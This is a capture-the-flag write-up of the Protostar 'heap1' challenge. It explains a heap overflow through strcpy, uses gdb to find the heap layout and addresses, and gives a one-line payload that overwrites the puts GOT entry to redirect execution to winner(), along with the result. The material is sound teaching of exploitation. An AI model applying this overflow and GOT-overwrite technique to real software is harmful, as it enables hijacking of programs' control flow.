# HEAP 1

# SOURCE CODE

```c
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <stdio.h>
#include <sys/types.h>

struct internet {
    int priority;
    char *name;
};

void winner()
{
  printf("and we have a winner @ %d\n", time(NULL));
}

int main(int argc, char **argv)
{
    struct internet *i1, *i2, *i3;

    i1 = malloc(sizeof(struct internet));
    i1->priority = 1;
    i1->name = malloc(8);

    i2 = malloc(sizeof(struct internet));
    i2->priority = 2;
    i2->name = malloc(8);

    strcpy(i1->name, argv[1]);                  // (1) Buffer Overflow occurs in here
    strcpy(i2->name, argv[2]);                  // (2)

    printf("and that's a wrap folks!\n");
}
```

## OVERVIEW

- Look at the main function, we can see that we have struct type used in this code, the `struct internet` is defined with 2 member variable that is `int` type and a `char*` type: `i1`, `i2`, `i3`, and `i3` will not be used.

- The program allocates for i1 and i2, then initialzes `priority` value and allocates memory for `name` that is char* pointer for both variable pointed by `i1` and `i2`.

- Then the program copy the content of input `arg[1]` and `arg[2]` to `i1->name` and `i2->name`. But, as we work with `strcpy()` in the last chall `heap0`, we can take advantage of `BOF vuln` of `strcpy` to overwrite to the heap memory to change the flow of program.

- In this challenge, we will use `(1) strcpy()` and `arg[1]` to overwrite the `name` of `i2` with address of `puts@GOT.plt`. And `(2) strcpy()` will be used for overwrite the `winner` address to the `puts@GOT.plt`. So if the program run to the `printf("...")` (it's acctually `puts()`, i find this when i disassemble the code) at the bottom of the main function, it redirects to the `winner` function.

```
0x08048555 <main+156>:  call   0x804838c <strcpy@plt>
0x0804855a <main+161>:  mov    DWORD PTR [esp],0x804864b
0x08048561 <main+168>:  call   0x80483cc <puts@plt>
0x08048566 <main+173>:  leave
0x08048567 <main+174>:  ret
End of assembler dump.
```

## DETAILS

- First, we must know the number of byte to overwrite to reach to the `i2->name`. So I run `heap1` with `gdb` to see the heap and calculate the number of byte.

- The useful command `info proc map` will help us to know what is the start of heap.

- So, after run the command, we can see the heap start at `0x804a000`.

```
(gdb) info proc map
process 7126
cmdline = '/opt/protostar/bin/heap1'
cwd = '/opt/protostar/bin'
exe = '/opt/protostar/bin/heap1'
Mapped address spaces:

        Start Addr   End Addr       Size     Offset objfile
         0x8048000  0x8049000     0x1000          0       /opt/protostar/bin/heap1
         0x8049000  0x804a000     0x1000          0       /opt/protostar/bin/heap1
         0x804a000  0x806b000    0x21000          0           [heap]
        0xb7e96000 0xb7e97000     0x1000          0
        0xb7e97000 0xb7fd5000   0x13e000          0         /lib/libc-2.11.2.so
        0xb7fd5000 0xb7fd6000     0x1000   0x13e000         /lib/libc-2.11.2.so
        0xb7fd6000 0xb7fd8000     0x2000   0x13e000         /lib/libc-2.11.2.so
        0xb7fd8000 0xb7fd9000     0x1000   0x140000         /lib/libc-2.11.2.so
        0xb7fd9000 0xb7fdc000     0x3000          0
        0xb7fe0000 0xb7fe2000     0x2000          0
        0xb7fe2000 0xb7fe3000     0x1000          0           [vdso]
        0xb7fe3000 0xb7ffe000    0x1b000          0         /lib/ld-2.11.2.so
        0xb7ffe000 0xb7fff000     0x1000    0x1a000         /lib/ld-2.11.2.so
        0xb7fff000 0xb8000000     0x1000    0x1b000         /lib/ld-2.11.2.so
        0xbffeb000 0xc0000000    0x15000          0           [stack]
```

- Let's put a breakpoint after 2 `strcpy()` and see what happen in heap.

```
(gdb) x/50xw 0x804a000
0x804a000:      0x00000000      0x00000011      0x00000001      0x0804a018
0x804a010:      0x00000000      0x00000011      0x41414141      0x00000000  ; write from 0x804a018 to 0x804a02b
0x804a020:      0x00000000      0x00000011      0x00000002      0x0804a038  ; and from 0x804a02c it will be address of puts@GOT.plt
0x804a030:      0x00000000      0x00000011      0x42424242      0x00000000
0x804a040:      0x00000000      0x00020fc1      0x00000000      0x00000000
```

- In this challenge we can ignore the informations of block, but look at the address and its data, we can overwrite like we talk in OVERVIEW section.
```
+-------------+--------------------------------+-------------------------------+
|             |                                |            its data           |
|   address   |     informations of block      +---------------+---------------+
|             |                                |  int priority |   char *name  |   
+-------------+--------------------------------+---------------+---------------+
| 0x804a000:  |   0x00000000      0x00000011   |   0x00000001  |    0x0804a018 |  <- this row is i1
+-------------+--------------------------------+---------------+---------------+
| 0x804a020:  |   0x00000000      0x00000011   |   0x00000002  |    0x0804a038 |  <- this row is i2
+-------------+--------------------------------+---------------+---------------+

+-------------+--------------------------------+-------------------------------+
|   address   |     informations of block      |           name's content      |
+-------------+--------------------------------+-------------------------------+
| 0x804a010:  |   0x00000000      0x00000011   |   0x41414141       0x00000000 |  <- name's content of i1
+-------------+--------------------------------+-------------------------------+
| 0x804a030:  |   0x00000000      0x00000011   |   0x42424242       0x00000000 |  <- name's content of i2
+-------------+--------------------------------+-------------------------------+
```

- So we must overwrite `20 bytes` and after that is address of `puts@GOT.plt`, and `arg[2]` will be address of `winner`, and the `(2) strcpy()` will does the overwrite to `puts@GOT.plt`, and then the program run into `printf()`, it redirects to `winner`.

- And by some basic command, I find the address of `winner` and `puts@GOT.plt`

- Address of `winner` is `0x08048494`

```
(gdb) disass winner
Dump of assembler code for function winner:
0x08048494 <winner+0>:  push   ebp
0x08048495 <winner+1>:  mov    ebp,esp
0x08048497 <winner+3>:  sub    esp,0x18
0x0804849a <winner+6>:  mov    DWORD PTR [esp],0x0
0x080484a1 <winner+13>: call   0x80483ac <time@plt>
0x080484a6 <winner+18>: mov    edx,0x8048630
0x080484ab <winner+23>: mov    DWORD PTR [esp+0x4],eax
0x080484af <winner+27>: mov    DWORD PTR [esp],edx
0x080484b2 <winner+30>: call   0x804839c <printf@plt>
0x080484b7 <winner+35>: leave
0x080484b8 <winner+36>: ret
End of assembler dump.
```

- Address of `puts@GOT.plt` is `0x8049774`

```
(gdb) disass 'puts@plt'
Dump of assembler code for function puts@plt:
0x080483cc <puts@plt+0>:        jmp    DWORD PTR ds:0x8049774
0x080483d2 <puts@plt+6>:        push   0x30
0x080483d7 <puts@plt+11>:       jmp    0x804835c
End of assembler dump.
```

- Now, let's exploit!

## EXPLOIT

- Command

```
./heap1 $(python -c 'print("a"*20 + "\x74\x97\x04\x08" + " " + "\x94\x84\x04\x08")')
```

## RESULT

```
root@protostar:/opt/protostar/bin# ./heap1 $(python -c 'print("a"*20 + "\x74\x97\x04\x08" + " " + "\x94\x84\x04\x08")')
and we have a winner @ 1673668863
```
